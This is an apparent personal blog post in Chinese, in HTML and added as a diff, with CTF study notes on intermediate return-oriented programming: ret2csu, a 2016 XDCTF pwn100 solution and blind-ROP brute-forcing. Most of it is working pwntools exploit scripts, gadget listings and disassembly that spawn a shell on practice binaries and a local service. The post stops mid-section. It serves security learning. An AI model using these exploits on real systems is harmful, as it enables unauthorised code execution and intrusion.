@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    中级ROP |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-中级ROP" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      中级ROP
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/" class="article-date">
+  <time datetime="2020-01-14T14:38:29.610Z" itemprop="datePublished">2020-01-14</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h1><a id="more"></a>
+
+<p>64位程序传参</p>
+<p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样</p>
+<h2 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h2><p>看ctf-wiki</p>
+<p>其中一个关于rsp移动的问题，就是payload中有一个 “a” * 0x38的具体解释见如下博客，感谢大佬</p>
+<p><a href="https://blog.csdn.net/zszcr/article/details/79833898" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79833898</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">sh = process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = level5.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span> <span class="comment">#这里的r12 r13 r14 分别为第三 第二 第一个参数</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'execve_addr '</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read(0,bss_base,16)</span></span><br><span class="line"><span class="comment">## read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, bss_base, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, <span class="number">0</span>, <span class="number">0</span>, bss_base + <span class="number">8</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>程序代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>可以通过不同的地址对不同的寄存器使用</p>
+<p>使用不同的gadgets</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret </span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>
+
+<p>例题：</p>
+<p>2016 XDCTF pwn100</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn-100'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn-100'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_addr = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span> </span><br><span class="line">gadget_1 = <span class="number">0x40075a</span></span><br><span class="line">gadget_2 = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x60107c</span>  <span class="comment">#存储/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    up = <span class="string">''</span>     </span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(pop_rdi)         <span class="comment">#这里使用了pop_rdi</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_addr)</span><br><span class="line">    payload += p64(start_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#防止未接受完整传回的数据</span></span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">            content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content += c</span><br><span class="line">            up = c</span><br><span class="line">    content = content[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)                <span class="comment">#其实可以使用libsearch来搜索system与bin/sh</span></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="comment">#调用read函数</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(gadget_2)</span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入/bin/sh</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">72</span>				</span><br><span class="line">payload += p64(pop_rdi)			</span><br><span class="line">payload += p64(bin_sh_addr)		</span><br><span class="line">payload += p64(system_addr)		</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)	</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>1.查看溢出函返回时哪个寄存值指向溢出缓冲区空间</p>
+<p>2.然后反编译二进制，查找 call reg 或者jmp reg指令，将 EIP 设置为该指令地址</p>
+<p>3.reg所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的</p>
+<p>拿一个例题：</p>
+<p>HCTF2016的pwn</p>
+<p>1.我们先爆破出栈溢出的长度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:   <span class="comment">#如果报错，会显示EOFErrot</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>2.爆破我们需要的gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'a'</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success addr: 0x%x'</span> % (addr)  <span class="comment">#若有正常返回，那么存在正确的add，输入即可，若没有，则报错</span></span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>
+
+<p>3.识别brop gadgets</p>
+<p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF</p>
+<p>4.所以我们可以接着去找put函数的地址即put@plt</p>
+<p>我们找到的gadget为libc_csu_init中的可以操作6个寄存器的</p>
+<p>所以我们可以使用pop_rdi = brop_add + 9来获得</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">72</span> +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>
+
+<p>具体函数:</p>
